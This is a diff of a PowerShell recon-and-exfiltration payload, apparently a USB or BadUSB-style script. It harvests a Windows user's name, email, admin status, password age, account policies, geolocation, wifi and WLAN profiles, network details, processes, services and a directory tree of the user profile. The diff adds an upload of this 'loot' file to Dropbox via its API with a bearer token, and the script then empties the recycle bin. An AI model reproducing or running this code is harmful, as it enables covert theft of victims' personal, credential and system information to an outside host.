@@ -46,7 +46,7 @@ if(!(Test-Path -Path $TARGETDIR )){
 
 ############################################################################################################################################################
 
- function Get-fullName {
+  function Get-fullName {
 
     try {
 
@@ -70,12 +70,26 @@ $FN = Get-fullName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
+function If-Admin {
+	$user = "$env:COMPUTERNAME\$env:USERNAME"
+	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
+if($isAdmin){
+	return "$env:UserName is in Admin Group" 
+	}
+	else{
+	return "$env:UserName is not in Admin Group" 
+	}
+}
+
+$Admin = If-Admin
+#------------------------------------------------------------------------------------------------------------------------------------
+
 function Get-email {
     
     try {
 
     $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
-	return $email
+    return $email
     }
 
 # If no email is detected function will return backup message for sapi speak
@@ -89,6 +103,36 @@ function Get-email {
 
 $EM = Get-email
 
+#------------------------------------------------------------------------------------------------------------------------------------
+function Get-Days_Set {
+
+    #-----VARIABLES-----#
+    # $pls (password last set) = the date/time their password was last changed 
+    # $days = the number of days since their password was last changed 
+
+    try {
+ 
+    $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
+    $plsPOS = $pls.IndexOf("e")
+    $pls = $pls.Substring($plsPOS+2).Trim()
+    $pls = $pls -replace ".{3}$"
+    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
+    $DateArray =$time.Split(".")
+    $days = [int]$DateArray[0]
+    }
+ 
+ # If no password set date is detected funtion will return $null to cancel Sapi Speak
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "Day password set not found" 
+    return $null
+    -ErrorAction SilentlyContinue
+    }
+
+    return "Password is $days old"
+}
+
+$lastPass = Get-Days_Set
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Get-GeoLocation{
@@ -121,53 +165,50 @@ $GL = Get-GeoLocation
 
 # Get nearby wifi networks
 
-try
-{
-$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
-}
-catch
-{
-$NearbyWifi="No nearby wifi networks detected"
-}
+try{$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()}
+
+catch{$NearbyWifi="No nearby wifi networks detected"}
 
 ############################################################################################################################################################
 
 # Get info about pc
 
 # Get IP / Network Info
-try
-{
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-}
-catch
-{
-$computerPubIP="Error getting Public IP"
-}
+try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
 
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+catch{$computerPubIP="Error getting Public IP"}
+
+try{$computerIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}).IPv4Address.IPAddress}
+
+catch{$computerIP="Error getting Local IP"}
 
 ############################################################################################################################################################
 
 $IsDHCPEnabled = $false
 $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
+
 foreach ($Network in $Networks) {
-If($network.DHCPEnabled) {
-$IsDHCPEnabled = $true
-  }
-$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+	If($network.DHCPEnabled) {
+		$IsDHCPEnabled = $true
+	}
+	$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
 }
 
 ############################################################################################################################################################
 
 #Get System Info
 $computerSystem = Get-CimInstance CIM_ComputerSystem
+
 $computerBIOS = Get-CimInstance CIM_BIOSElement
 
 $computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
+
 $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+
 $computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
 
 $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+
 $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
 
 ############################################################################################################################################################
@@ -180,7 +221,7 @@ $driveType = @{
    5="Compact disk "}
 $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
 
-#Get - Com & Serial Devices
+# Get - Com & Serial Devices
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 
 # Check RDP
@@ -229,6 +270,9 @@ $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Na
 # process first
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 
+# process last
+$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
+
 # Get Listeners / ActiveTcpConnections
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
@@ -244,8 +288,6 @@ $listener = $listener | foreach-object {
     }
 } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
 
-# process last
-$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
 
 # service
 $service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName
@@ -272,22 +314,54 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
 Clear-Host
 Write-Host 
 
+echo $PSVersionTable >> $env:TMP\$FileName
+echo "" >> $env:TMP\$FileName
+
 echo "Name:" >> $env:TMP\$FileName
 echo "==================================================================" >> $env:TMP\$FileName
 echo $FN >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
+
+echo $Admin >> $env:TMP\$FileName
+echo "" >> $env:TMP\$FileName
+
 echo "Email:" >> $env:TMP\$FileName
 echo "==================================================================" >> $env:TMP\$FileName
 echo $EM >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
+
+echo (net user) >> $env:TMP\$FileName
+echo "" >> $env:TMP\$FileName
+
+echo (net accounts) >> $env:TMP\$FileName
+echo "" >> $env:TMP\$FileName
+
+echo $lastPass >> $env:TMP\$FileName
+echo "" >> $env:TMP\$FileName
+
 echo "GeoLocation:" >> $env:TMP\$FileName
 echo "==================================================================" >> $env:TMP\$FileName
 echo $GL >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
+
 echo "Nearby Wifi:" >> $env:TMP\$FileName
 echo "==================================================================" >> $env:TMP\$FileName
 echo $NearbyWifi >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
+
+"Network: 
+==================================================================
+Computers MAC address: " + $MAC >> $env:TMP\$FileName
+"Computers IP address: " + $computerIP >> $env:TMP\$FileName
+"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
+"RDP: " + $RDP >> $env:TMP\$FileName
+"" >> $env:TMP\$FileName
+
+($Network| out-string) >> $env:TMP\$FileName
+
+"W-Lan profiles: 
+=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName
+
 $computerSystem.Name >> $env:TMP\$FileName
 "==================================================================
 Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
@@ -323,18 +397,6 @@ Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$File
 "COM & SERIAL DEVICES:
 ==================================================================" + ($COMDevices | Out-String) >> $env:TMP\$FileName
 
-"Network: 
-==================================================================
-Computers MAC address: " + $MAC >> $env:TMP\$FileName
-"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
-"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
-"RDP: " + $RDP >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-($Network| out-string) >> $env:TMP\$FileName
-
-"W-Lan profiles: 
-=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName
-
 "listeners / ActiveTcpConnections
 =================================================================="+ ($listener| Out-String) >> $env:TMP\$FileName
 
@@ -357,6 +419,7 @@ Computers MAC address: " + $MAC >> $env:TMP\$FileName
 ############################################################################################################################################################
 
 # Recon all User Directories
+
 tree $Env:userprofile /a /f >> $env:TMP\$FileName
 
 ############################################################################################################################################################
@@ -374,9 +437,17 @@ vault -ErrorAction SilentlyContinue -Force
 
 ############################################################################################################################################################
 
-# Exfiltrate Loot
+# Upload output file to dropbox
 
-Move-Item $env:TMP\$FileName $TARGETDIR\$FileName
+$TargetFilePath="/$FileName"
+$SourceFilePath="$env:TMP\$FileName"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
 ############################################################################################################################################################
 
@@ -408,4 +479,3 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 # Popup message to signal the payload is done
 
 $done = New-Object -ComObject Wscript.Shell;$done.Popup("script is done",1)
-	
